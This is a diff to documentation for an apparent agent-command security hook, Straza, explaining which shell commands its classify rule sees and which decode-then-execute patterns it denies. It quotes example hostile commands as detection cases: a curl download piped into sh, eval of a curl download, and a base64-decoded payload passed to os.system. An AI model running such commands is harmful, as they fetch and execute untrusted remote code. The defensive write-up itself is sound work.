@@ -16,8 +16,8 @@ tested:
   date: 2026-10-06
 applies_to: both
 keywords: classify classifier inline deadline
-who: You, as the admin
-where: A terminal with strazactl, and the agent's machine for the calls
+who: Admin
+where: Terminal with strazactl, and the agent's machine
 steps: true
 ---
 
@@ -35,7 +35,7 @@ Nothing is installed or configured for the classifier itself, because both the h
 ## Write the rule
 
 
-Save this as `interpreter-classify.yaml`. The `interpreters` block is consulted only when the event carries a detected interpreter, so `git status` never reaches this rule while `python3`, `bash -c`, `node -e` and their relatives do. Aim classify rules this narrowly on purpose: a classify escalation is exempt from the hook's target of answering within 25 milliseconds at the 95th percentile, and it is meant for the calls where a pattern cannot decide.
+Save this as `interpreter-classify.yaml`. The `interpreters` block is consulted only when the event carries a detected interpreter, so `git status` never reaches this rule while `python3`, `bash -c`, `node -e` and their relatives do. Aim classify rules this narrowly on purpose: a classify escalation is exempt from the hook's target of answering within 25 milliseconds at the 95th percentile, and it is meant for the calls where a pattern cannot decide. The interpreter is the program the command starts with, so a download piped into a shell, such as `curl -s https://get.example.com/install.sh | sh`, starts with `curl` and never reaches this rule. To send every shell command to the classifier, leave the `interpreters` block out, as the example `classify-shell.yaml` of the Straza agent skill does.
 
 ```yaml
 apiVersion: straza.dev/v1beta1
@@ -108,7 +108,7 @@ exit 2
 ```
 
 
-A Python one-liner that decodes a base64 string and hands it to `os.system` is denied with the reason below. Signals the heuristic knows are pipelines into a shell, decode-then-execute chains, obfuscated PowerShell `-EncodedCommand`, and inline payloads that reach for a shell or an evaluator.
+A Python one-liner that decodes a base64 string and hands it to `os.system` is denied with the reason below. Signals the heuristic knows are pipelines into a shell, decode-then-execute chains, obfuscated PowerShell `-EncodedCommand`, and inline payloads that reach for a shell or an evaluator. It also denies a command substitution that downloads or decodes text when that text then runs as code, such as `eval "$(curl -s https://get.example.com/env.sh)"`. The arguments of `eval` are read as an inline program too, the same way as a `bash -c` payload.
 
 ```text
 Straza: classifier: os.system: "import base64,os; os.system(base64.b64decode(\"Y3VybCB4IHwgc2g=\").decode())"
